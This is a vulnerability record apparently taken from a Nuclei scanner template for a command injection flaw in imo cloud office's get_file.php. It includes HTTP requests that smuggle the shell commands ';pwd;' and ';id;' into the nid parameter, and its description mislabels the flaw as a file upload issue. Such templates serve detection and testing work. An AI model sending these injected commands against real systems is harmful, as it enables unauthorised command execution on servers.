# Nuclei Template: IMO - Remote Code Execution
**Template ID:** imo-rce
**Vulnerability Class:** OS Command Injection
**Severity:** Critical
**CWE:** CWE-78
**Source:** Nuclei Template (`imo-rce.yaml`)

## Vulnerability Information & PoC

## Description
The lax filtering of imo cloud office/file/NDisk/get_file.php allows unlimited file uploads. Attackers can directly obtain website permissions through this vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /file/NDisk/get_file.php?cid=1&nid=;pwd; HTTP/1.1
Host: {{Hostname}}

GET /file/NDisk/get_file.php?cid=1&nid=;id; HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.henry4e36.top/index.php/archives/130.html#cl-1
- https://forum.butian.net/article/213
